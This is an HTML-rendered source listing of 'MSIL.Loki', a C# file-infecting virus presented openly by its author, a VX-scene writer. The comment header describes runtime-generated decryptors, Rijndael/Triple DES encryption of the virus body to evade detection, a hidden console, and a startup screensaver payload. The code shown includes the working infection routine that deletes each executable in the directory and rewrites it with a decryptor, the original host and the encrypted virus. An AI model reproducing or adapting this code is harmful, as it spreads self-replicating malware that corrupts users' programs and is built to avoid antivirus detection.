<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MSIL.Loki - loki.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*************************************************************
 * C# - MSIL.Loki
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 * by free0n
 * vx13d.net free0n@vx13d.net | DoomRiderz www.doomriderz.com
 * ########################################################### 
 * ++LOKI++
 * 
 * Loki is a .net C# virus that will infect all the executables
 * found in the current directory. The file infection is unique
 * as it has the advantage to be able to decrypt/encrypt the
 * virus body based on Rijandel or Triple DES. Both encryptions
 * generate their keys dynamically
 * 
 *  How is it able to encrypt itself and still work? 
 *  Well Loki can build a decryptor at runtime! duh! :) this is 
 *  something I haven't seen yet so I might be the first
 * 
 *  It basically works like this  
 *  1. generate decryptor
 *  2. generate encrypted virus 
 *  3. Infect file
 * 
 * The file structure of an infected file looks like this.
 *  - decryptor
 *  - original host program
 *  - encrypted virus
 *
 * Note: The decryptor gets put in first so it gets executed first.
 *
 * The decryptor that we generate on the fly has 2 responsibilities
 * 1. Extract host program from itself and run it
 * 2. Then once the host program has finished running decrypt 
 *    the virus and execute it.
 *
 * since we build it from source we can change variable names
 * in the decryptor making it even more harder to find!
 * 
 * The other cool part is the payload. If Loki hasn't ran
 * before or the reg key gets deleted it will create a screensaver
 * and dump it into the startup directory. So the next time
 * the user restarts their computer their screen will turn black
 * and a Red message saying
 * "You have been infected with MSIL.Loki by free0n" will bounce
 * across the screen muwhahaha it's pretty funny.
 *
 * Note: Yes this looks like a console application which
 * would have a command prompt or dos box open but with
 * Loki you create the Console application then change
 * the output type to windows form (its in project properties). 
 * This makes it so it still runs like a console app but 
 * no dos box opens making it a little more sneaky
 * Use VC# express to build... 
 * 
 * Lates!
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc3">/************************************************************
 * Start of Program.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Loki</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Program</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">Loki</span><span class="sc0"> </span><span class="sc11">loki</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Loki</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//decide which encryption/decryption to use
</span><span class="sc0">            </span><span class="sc2">//based on if the random number is even or odd
</span><span class="sc0">            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//generate a key based on e
</span><span class="sc0">            </span><span class="sc11">loki</span><span class="sc10">.</span><span class="sc11">Generatekey</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//populate the current directory
</span><span class="sc0">            </span><span class="sc11">loki</span><span class="sc10">.</span><span class="sc11">Populate</span><span class="sc10">(</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">());</span><span class="sc0">

            </span><span class="sc2">//check to see if we already have ran
</span><span class="sc0">            </span><span class="sc2">//if we haven't then build our kick ass message!
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">loki</span><span class="sc10">.</span><span class="sc11">Check</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">loki</span><span class="sc10">.</span><span class="sc11">GenerateMsg</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc3">/************************************************************
 * Start of Loki.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">CSharp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">CodeDom</span><span class="sc10">.</span><span class="sc11">Compiler</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Security</span><span class="sc10">.</span><span class="sc11">Cryptography</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Loki</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Loki</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">encm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">iv</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Populate</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hostbytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hostbytes</span><span class="sc10">[</span><span class="sc4">60</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
                            
                            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetCurrentProcess</span><span class="sc10">().</span><span class="sc11">MainModule</span><span class="sc10">.</span><span class="sc11">FileName</span><span class="sc10">);</span><span class="sc0"> 
                            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">nf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ef</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Year</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">enc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">cf</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">nf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">CreateNew</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">enc</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">enc</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">]);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                            </span><span class="sc11">Encrypt</span><span class="sc10">(</span><span class="sc11">nf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ef</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">encm</span><span class="sc10">);</span><span class="sc0">
                            
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">nf</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">nf</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">

                                </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">df</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Decryptor</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5632</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5632</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">encm</span><span class="sc10">);</span><span class="sc0">
                                
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">df</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">byteDec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">df</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">byteEnc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                                        
                                        </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">CreateNew</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bwb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fsb</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">byteDec</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">byteDec</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">hostbytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">hostbytes</span><span class="sc10">[</span><span class="sc11">w</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">byteEnc</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">z</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">byteEnc</span><span class="sc10">[</span><span class="sc11">z</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        
                                        </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                                        </span><span class="sc11">fsb</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">df</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">ef</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//simply reads a file and returns it as a byte array
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">br</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">b</span><span class="sc10">[</span><span class="sc11">f</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">br</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">br</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
